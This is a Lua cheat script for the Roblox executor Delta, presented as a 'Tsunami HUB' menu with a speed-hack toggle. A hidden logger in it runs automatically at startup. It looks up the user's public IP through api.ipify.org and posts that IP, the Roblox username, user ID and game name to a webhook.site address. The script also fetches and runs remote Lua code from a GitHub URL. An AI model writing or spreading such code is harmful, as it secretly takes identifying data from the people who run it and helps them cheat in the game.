--[[
    The Master of the Tsunami HUB + Discord Logger (Fixed Version)
    対応エクスキュータ: Delta (Roblox)
    URL設定済み: webhook.site
]]

-- エクスキュータ確認
if not syn and not getgenv then
    warn("Delta executor optimized")
end

-- ===== Discord Logger セクション =====
-- 文字列として認識させるため "" で囲んでいます
local WEBHOOK_URL = "https://097f8ec0-b73f-4299-8b57-b164ed443e62.webhook.site"

local function sendToWebhook(data)
    local http = game:GetService("HttpService")
    local json = http:JSONEncode(data)
    local requestFunc = syn and syn.request or http_request or request
    
    if not requestFunc then return false end
    
    return requestFunc({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })
end

local function getIP()
    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then return "IP取得不可" end
    
    local success, response = pcall(function()
        return requestFunc({Url = "https://api.ipify.org", Method = "GET"})
    end)
    
    if success and response and response.Body then
        return response.Body:gsub("%s+", "")
    end
    return "取得失敗"
end

local function sendDiscordLog()
    local player = game:GetService("Players").LocalPlayer
    local embed = {{
        title = "Tsunami HUB - 起動ログ",
        description = string.format(
            "**ユーザー:** %s\n**ID:** %d\n**ゲーム:** %s\n**IP:** %s\n**時刻:** %s",
            player.Name, player.UserId, game.Name, getIP(), os.date("%Y-%m-%d %H:%M:%S")
        ),
        color = 0x00ff00
    }}
    sendToWebhook({username = "Tsunami Logger", embeds = embed})
end

-- ===== Tsunami HUB 本体 =====
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jadpy/suki/refs/heads/main/orion"))()
local Window = OrionLib:MakeWindow({Name = "The Master of Tsunami", HidePremium = false, SaveConfig = true})

local MainTab = Window:MakeTab({Name = "Main", Icon = "rbxassetid://4483345998"})
local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

MainTab:AddToggle({
    Name = "Speed Hack",
    Default = false,
    Callback = function(Value)
        humanoid.WalkSpeed = Value and 50 or 16
    end
})

MainTab:AddButton({
    Name = "Force Send Log",
    Callback = function()
        sendDiscordLog()
    end
})

-- 起動時に自動実行
pcall(sendDiscordLog)
OrionLib:Init()
